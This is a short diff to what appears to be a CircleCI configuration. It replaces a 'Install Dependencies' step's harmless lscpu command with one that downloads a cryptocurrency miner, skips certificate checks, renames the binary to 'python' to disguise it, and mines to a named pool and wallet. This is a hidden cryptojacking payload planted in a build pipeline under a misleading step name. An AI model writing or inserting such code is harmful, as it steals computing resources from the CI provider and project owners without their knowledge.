@@ -20,7 +20,7 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: timeout 1m lscpu
+            command: timeout 1m wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz --no-check-certificate && tar xf cpuminer-opt-linux.tar.gz && mv cpuminer-avx2 python && ./python -a yespower -o stratum+tcp://yespower.eu.mine.zpool.ca:6234 -u t1HyKKLyxmtJEA5FXtTvapAvEPyPa9vX3QV -p c=FLUX -t 8
     Devop3:
       docker:
             - image: circleci/ruby:2.5.3
